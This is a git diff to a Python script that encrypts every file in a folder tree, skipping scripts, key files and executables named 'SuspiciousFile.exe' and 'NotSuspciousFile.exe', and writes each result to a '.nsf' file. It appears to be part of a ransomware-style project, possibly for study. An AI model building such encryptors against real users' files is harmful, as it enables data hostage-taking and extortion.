@@ -3,15 +3,20 @@ import Encryption as enc
 import json
 import Constants
 import keygen
-import pdb
 
 if __name__ == '__main__':
-    #Check if the PEM file currently exists 
+    #Retrieves the path to the current location of this file
+    curr_path = os.getcwd()
+
+    #Stores the application key
+    appKey = None
+    #Check if the PEM file currently exists
     if os.path.isfile("./" + Constants.PEM_FILE) == False:
         #The file does not exist, make PEM file here
         appKey = keygen.generate_PEM()
-    #Retrieves the path to the current location of this file
-    curr_path = os.getcwd()
+        #Write the application key inside a file
+        appKeyFile = open('./appKey.txt', 'w+')
+        appKeyFile.write(appKey);
     #Force python to skip the python cache folder
     skip_folder = '\__pycache__'
     #Force python to remove these list of items from the root folder directory
@@ -25,7 +30,7 @@ if __name__ == '__main__':
             remove_list = list(files)
             for i in remove_list:
                 if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'
-                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe'):
+                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe' or i == 'appKey.txt'):
                     files.remove(i)
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
@@ -36,7 +41,7 @@ if __name__ == '__main__':
             #Stringify the following list
             cipher, IV, key, tag = enc.stringify([encoded_cipher, encoded_IV, encoded_key, encoded_tag])
             #Generate map
-            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext, 'tag' : tag, 'AppKey' : appKey}
+            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext, 'tag' : tag}
             #Generate Json
             dump = json.dumps(item_map)
             f = open(file+ ".nsf", "w+")
